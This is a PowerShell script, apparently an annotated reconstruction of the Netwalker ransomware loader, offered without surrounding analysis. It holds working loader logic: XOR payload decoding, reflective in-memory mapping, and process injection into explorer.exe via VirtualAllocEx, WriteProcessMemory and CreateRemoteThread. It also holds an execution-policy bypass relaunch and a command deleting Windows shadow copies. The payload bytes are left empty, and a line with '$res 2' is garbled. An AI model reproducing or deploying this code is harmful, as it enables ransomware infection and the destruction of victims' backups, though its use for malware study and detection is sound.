[byte[]]$payloadX86="" # cf binary NetwalkerX86.bin
[byte[]]$payloadX64="" # cf binary NetwalkerX64.bin
function DecodeXORValue
{
    param
    (
        [Parameter(Position = 0 , Mandatory = $true)] [string] $data,
        [Parameter(Position = 1 , Mandatory = $true)] [byte] $valueXor
   )
    $payload = [System.Convert]::FromBase64String($data)
    for ($i = 0; $i -lt $payload.length; $i++) { $payload[$i] = $payload[$i] -bxor $valueXor }
    return [System.Text.Encoding]::ASCII.GetString($payload)
}
$NETClass1 =  "" # cf Assembly.cs
$ImportWin32Functions = "" # cf Win32Functions.cs
Add-Type -TypeDefinition $NETClass1 -Language "CSharp" # Load .NET class by Add-Type method
$Win32FunctionsLoaded = Add-Type -MemberDefinition $ImportWin32Functions -Name 'Wdr' -Namespace "WINAPI" -PassThru # Import Win32 functions
Function DecodeData # Custom algorithm based on RC4 loop
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $true)] [Int64] $datainput1,    
        [Parameter(Position = 1, Mandatory = $true)] [Int64] $datainput2
   )
    [Byte[]]$ArrayBytes = [BitConverter]::GetBytes($datainput1)
    [Byte[]]$ArrayBytes2 = [BitConverter]::GetBytes($datainput2)
    [Byte[]]$result = [BitConverter]::GetBytes([UInt64]0)
    if ($ArrayBytes.Count -eq $ArrayBytes2.Count)
    {
        $j = 0
        for ($inc = 0; $inc -lt $ArrayBytes.Count; $inc++)
        {
			$i = $ArrayBytes[$inc] - $j
			if ($i -lt $ArrayBytes2[$inc])
			{
				$i += 256
				$j = 1
			}
			else { $j = 0 }
			[UInt16]$val = $i - $ArrayBytes2[$inc]
			$result[$inc] = $val -band 0x00FF
        }
    }
    else  { Throw }
    return [BitConverter]::ToInt64($result, 0)
}
Function CompareValue
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $true)] [Int64] $datainput,    
        [Parameter(Position = 1, Mandatory = $true)] [Int64] $datainput2
   )
    [Byte[]]$CompBytes1 = [BitConverter]::GetBytes($datainput)
    [Byte[]]$CompBytes2 = [BitConverter]::GetBytes($datainput2)
    [Byte[]]$result = [BitConverter]::GetBytes([UInt64]0)
    if ($CompBytes1.Count -eq $CompBytes2.Count)
    {
        $offset = 0
        for ($i = 0; $i -lt $CompBytes1.Count; $i++)
        {
			[UInt16]$val = $CompBytes1[$i] + $CompBytes2[$i] + $offset
			$result[$i] = $val -band 0x00FF # 0x00FF -> 255
			if (($val -band 0xFF00) -eq 0x100) { $offset = 1  }
			else { $offset = 0 }
        }
    }
    return [BitConverter]::ToInt64($result, 0)
}
Function ConvertData
{
    Param ([Parameter(Position = 0, Mandatory = $true)] [UInt64] $data)
    [Byte[]]$r = [BitConverter]::GetBytes($data)
    return ([BitConverter]::ToInt64($r, 0))
}
Function ConvertIntBytes
{
    Param ([Parameter(Position = 0, Mandatory = $true)] [Int16] $data )
    [Byte[]]$r = [BitConverter]::GetBytes($data)
    return ([BitConverter]::ToUInt16($r, 0))
}
Function ReflectExec
{
    Param([OutputType([Type])]
   [Parameter(Position = 0)] [Type[]] $ArrayBytes = (New-Object Type[](0)),
   [Parameter(Position = 1)] [Type] $Void  = [Void])
    $refDomain = [AppDomain]::CurrentDomain
    $ReflectAssembly = New-Object Reflection.AssemblyName($("ReflectedDelegate"))
    $Exec = $refDomain.DefineDynamicAssembly($ReflectAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $Struct = $Exec.DefineDynamicModule($("InMemoryModule"), $false)
    $s = $Struct.DefineType($("MyDelegateType"), $("Class, Public, Sealed, AnsiClass, AutoClass"), [System.MulticastDelegate])
    $Const = $s.DefineConstructor($("RTSpecialName, HideBySig, Public"), [System.Reflection.CallingConventions]::Standard, $ArrayBytes)
    $Const.SetImplementationFlags($("Runtime, Managed"))
    $r = $s.DefineMethod($("Invoke"), $("Public, HideBySig, NewSlot, Virtual"), $Void , $ArrayBytes)
    $r.SetImplementationFlags($("Runtime, Managed"))
    return $s.CreateType()
}
function Injection 
{
    param
    (
        [Parameter(Position = 0 , Mandatory = $true)] [IntPtr] $datainput1,
        [Parameter(Position = 1 , Mandatory = $true)] [IntPtr] $datainput2,
        [Parameter(Position = 2 , Mandatory = $true)] [UInt32] $stop,
        [Parameter(Position = 3 , Mandatory = $true)] [System.IntPtr] $refData
   )
    $ref = 0xa000
    if([System.IntPtr]::Size -eq 4) { $ref = 0x3000 }
    if($stop -eq 0)  { return $false }
    $Array1 = DecodeData $datainput2 $refData
    $PtrAssembly = CompareValue $datainput1 $(ConvertData $stop)
    $MemBlock = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PtrAssembly,[Type][rAysT.THHoPEueqNhrPOcKa]) #Allocate .Net Assembly
    while ($MemBlock.eCI) #UInt .Net Class -> While + condition stop
    {
        $RefInt = CompareValue $datainput1 $(ConvertData $MemBlock.eCI)
        $lim = ($MemBlock.eIieW - ([UInt32]8)) /2
        $val = CompareValue $PtrAssembly 8
        for($i=0;$i -lt $lim ; $i++)
        {
			$v = ConvertIntBytes $([System.Runtime.InteropServices.Marshal]::ReadInt16($val))
			if($($v -band $ref) -eq $ref)
			{
				$tmp = $v -band 0xfff
				$c = CompareValue $RefInt $tmp
				$p = CompareValue $([System.Runtime.InteropServices.Marshal]::ReadIntPtr($c)) $Array1
				[System.Runtime.InteropServices.Marshal]::WriteIntPtr($c,$p)
			}
			$val = CompareValue $val 2
        }
        $PtrAssembly = CompareValue $PtrAssembly $(ConvertData $MemBlock.eIieW)
        $MemBlock = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PtrAssembly,[Type][rAysT.THHoPEueqNhrPOcKa])
    }
    return $true
}
function PerformInjection
{
    param
    (
        [Parameter(Position = 0 , Mandatory = $true)] [UInt32] $ProcessID,
        [Parameter(Position = 1 , Mandatory = $true)] [IntPtr] $Buffer,
        [Parameter(Position = 2 , Mandatory = $true)] [UInt32] $Size,
        [Parameter(Position = 3 , Mandatory = $true)] [UInt32] $datainput,
        [Parameter(Position = 4 , Mandatory = $true)] [bool] $condition,
        [Parameter(Position = 5 , Mandatory = $true)] [ref] $c
   )
    $c.value = $false
    $v = $Win32FunctionsLoaded::CIcDkEPvhYhrCCEvI([UInt32]0x43A, $false, [UInt32]$ProcessID) # OpenProcess -> HANDLE OpenProcess(DWORD dwDesiredAccess,BOOL bInheritHandle,DWORD dwProcessId);
    if ($v -ne 0)
    {
        $s = $Win32FunctionsLoaded::OtaIoED(0, $Size, 12288, 0x04) # VirtualAlloc -> LPVOID VirtualAlloc(LPVOID lpAddress,SIZE_T dwSize,DWORD flAllocationType,DWORD flProtect);
        if ($s -ne 0)
        {   $Proc = $Win32FunctionsLoaded::FMZmzgMkrG() # GetCurrentProcess
			$mem = $Win32FunctionsLoaded::EsGWYPYhiZfpMKaJZV($Proc, $s, $Buffer, $Size, [ref]([UInt32]0)) # WriteProcessMemory -> BOOL WriteProcessMemory(HANDLE hProcess,LPVOID lpBaseAddress,LPCVOID lpBuffer,SIZE_T nSize,SIZE_T *lpNumberOfBytesWritten);
			if ($mem -eq $true)
			{    
				$r = $Win32FunctionsLoaded::qRPmFXhkuFSN([IntPtr]$v, 0, $Size, 12288, 0x40) # VirtualAllocEx -> LPVOID VirtualAllocEx(HANDLE hProcess,LPVOID lpAddress,SIZE_T dwSize,DWORD flAllocationType,DWORD flProtect);
				if ($r -ne 0)
				{  
					if ($condition -eq $false)
					{
						$struc = [System.Runtime.InteropServices.Marshal]::PtrToStructure($s,[Type][rAysT.TJVQm])
						$refstr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($(CompareValue $s $(ConvertData $struc.IXKyZmBSAvp)), [Type][rAysT.IqpYsflQR])
						Injection $s $r $refstr.qyNjiKGfawtIKvIG.YkQ.DTNy $(ConvertData $refstr.qyNjiKGfawtIKvIG.iYMKjeyaVrBrHnPWnWK)
					}
					$mem = $Win32FunctionsLoaded::EsGWYPYhiZfpMKaJZV($v, $r, $s, $Size, [ref]([UInt32]0)) # WriteProcessMemory
					if ($mem -eq $true)
					{       
						$Address = CompareValue $r $(ConvertData ($datainput))
						$ResultInjection = $Win32FunctionsLoaded::XtSXrcJonvCMcGwm($v, 0, 0, $Address, 0, 0, 0) # CreateRemoteThread -> HANDLE CreateRemoteThread(HANDLE hProcess,LPSECURITY_ATTRIBUTES lpThreadAttributes,SIZE_T dwStackSize,LPTHREAD_START_ROUTINE lpStartAddress,LPVOID lpParameter,DWORD dwCreationFlags,LPDWORD lpThreadId);
						if ($ResultInjection -ne 0) { $c.value = $true }
					}
				}
			}
			$Win32FunctionsLoaded::xycvsJtyHgipAMmxSU($s, ([UInt32]0), 0x00008000) | Out-Null
        }
        $Win32FunctionsLoaded::ETFuUeRwmAyBqho($v) | Out-Null
    }
    return
}
function Search-Injection
{
    param
    (
        [Parameter(Position = 0 , Mandatory = $true)] [string] $process,
        [Parameter(Position = 1 , Mandatory = $true)] [IntPtr] $Buffer,
        [Parameter(Position = 2 , Mandatory = $true)] [UInt32] $Size,
        [Parameter(Position = 3 , Mandatory = $true)] [UInt32] $datainput,
        [Parameter(Position = 4 , Mandatory = $true)] [bool] $condition,
        [Parameter(Position = 5 , Mandatory = $true)] [ref] $c
   )
    $c.value = $false
    foreach ($p in get-process $process)
    {
        $ProcessID = $p.id
        if ($condition -eq $true)
        {
			$ProcessID = 0;
			$b = $false
            foreach ($modules in $p.modules) { if ($modules.filename -eq "wow64.dll") { $b = $true } }
			if ($b -eq $false) { $ProcessID = $p.id }
        }
		if ($ProcessID -ne 0)
		{
			if ($p.mainwindowhandle -ne 0)
			{
				$i = 0
				PerformInjection $ProcessID $Buffer $Size $datainput $condition ([ref]$i)
				if ([bool]$i -eq $true)
				{ 
					$c.value = $true
					break
				}
			}
		}
    }
return 
}
[byte[]]$Array_bytes = 0
$c = $false
if ((Get-WmiObject Win32_processor).AddressWidth -eq 64)
{      
    if ($env:PROCESSOR_ARCHITECTURE -ne "amd64")
    {
        if ($myInvocation.Line) { &"$env:WINDIR\sysnative\windowspowershell\v1.0\powershell.exe" -ExecutionPolicy ByPass -NoLogo -NonInteractive -NoProfile -NoExit $myInvocation.Line }
        else { &"$env:WINDIR\sysnative\windowspowershell\v1.0\powershell.exe" -ExecutionPolicy ByPass -NoLogo -NonInteractive -NoProfile -NoExit -file "$($myInvocation.InvocationName)" $args }
        exit $lastexitcode
    }
    for($i = 0; $i -lt $payloadX64.Length; $i++) { $payloadX64[$i] = $payloadX64[$i] -bxor 0x6c }
    [byte[]]$Array_bytes = $payloadX64
    $c = $true
}
else
{
    for($j = 0; $j -lt $payloadX86.Length; $j++) { $payloadX86[$j] = $payloadX86[$j] -bxor 0xec }
    [byte[]]$Array_bytes = $payloadX86
}
[System.IntPtr]$ptr1 = 0
[System.IntPtr]$ptr2 = 0
$InfoProc = $Win32FunctionsLoaded::FMZmzgMkrG() # GetCurrentProcess
try 
{
    $ptr1 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Array_bytes.Length)
    [System.Runtime.InteropServices.Marshal]::Copy($Array_bytes, 0, $ptr1, $Array_bytes.Length)
}
catch { return }
$ps = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ptr1,[Type][rAysT.TJVQm])
$val = 0
if ($c -eq $true) { $val = [System.Runtime.InteropServices.Marshal]::PtrToStructure($(CompareValue $ptr1 $(ConvertData $ps.IXKyZmBSAvp)), [Type][rAysT.TOJmBqYBQIhMwvvu]) }
else { $val = [System.Runtime.InteropServices.Marshal]::PtrToStructure($(CompareValue $ptr1 $(ConvertData $ps.IXKyZmBSAvp)), [Type][rAysT.IqpYsflQR])}
$ptr2 = $Win32FunctionsLoaded::OtaIoED(0, $val.qyNjiKGfawtIKvIG.RhYtihtdVKefK, 12288, 0x04) # VirtualAlloc
if($ptr2 -eq 0){ return }
$r1 = $Win32FunctionsLoaded::EsGWYPYhiZfpMKaJZV($InfoProc, $ptr2, $ptr1, $val.qyNjiKGfawtIKvIG.UkoFPlKhFvxm, [ref]([UInt32]0)) # WriteProcessMemory
if ($r1 -eq $false) { return }
$r2 = $(CompareValue $ptr1 $(ConvertData $ps.IXKyZmBSAvp))
if ($c -eq $true) { $r2 = CompareValue $r2 $([System.Runtime.InteropServices.Marshal]::SizeOf([Type][rAysT.TOJmBqYBQIhMwvvu])) }
else 
{
    $r2 = CompareValue $r2 $([System.Runtime.InteropServices.Marshal]::SizeOf([Type][rAysT.IqpYsflQR])) 
}
for($i= 0; $i-lt $val.OxUrqFJjjHiPyiO.TJVqg; $i++)
{
    $s1 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($r2,[Type][rAysT.dbLwD])
    $comp1  = CompareValue $ptr1 $(ConvertData $s1.UGBBTiwzy)
    $comp2 = CompareValue $ptr2 $(ConvertData $s1.XFRcUvLLUcEQ)
    $r1 = $Win32FunctionsLoaded::EsGWYPYhiZfpMKaJZV($InfoProc, $comp2, $comp1, $s1.WYPoTMpwmHa, [ref]([UInt32]0)) # WriteProcessMemory
    if ($r1 -eq $false) { return }
    $r2 = CompareValue $r2 $([System.Runtime.InteropServices.Marshal]::SizeOf([Type][rAysT.dbLwD]))
}
$res = 0
Search-Injection $("explorer") $ptr2 $val.qyNjiKGfawtIKvIG.RhYtihtdVKefK $val.qyNjiKGfawtIKvIG.laonnCMgpT $c ([ref]$res)
if([bool]$res -ne $true)
{
    $res1 = $Win32FunctionsLoaded::cHRPUOi($InfoProc, $ptr2, $val.qyNjiKGfawtIKvIG.RhYtihtdVKefK, 0x40, 0) # VirtualProtectEx
    if ($res1 -eq $true)
    {
        if ($c -eq $false) { Injection $ptr2 $ptr2 $val.qyNjiKGfawtIKvIG.YkQ.DTNy $(ConvertData $val.qyNjiKGfawtIKvIG.iYMKjeyaVrBrHnPWnWK)     }      
        $refvalue = CompareValue $ptr2 $(ConvertData ($val.qyNjiKGfawtIKvIG.laonnCMgpT))
        $res 2 = ReflectExec @([System.IntPtr],[UInt32],[System.IntPtr]) ([bool])
        $prog = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($refvalue, $res 2)
        $prog.Invoke(0, 0, 0) | Out-Null
    }
}
Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();} | Out-Null | Invoke-Expression # clear Backup Windows
$Win32FunctionsLoaded::xycvsJtyHgipAMmxSU($ptr2,([UInt32]0),0x00008000) | Out-Null # VirtualFree
$Win32FunctionsLoaded::ETFuUeRwmAyBqho($InfoProc) | Out-Null # CloseHandle
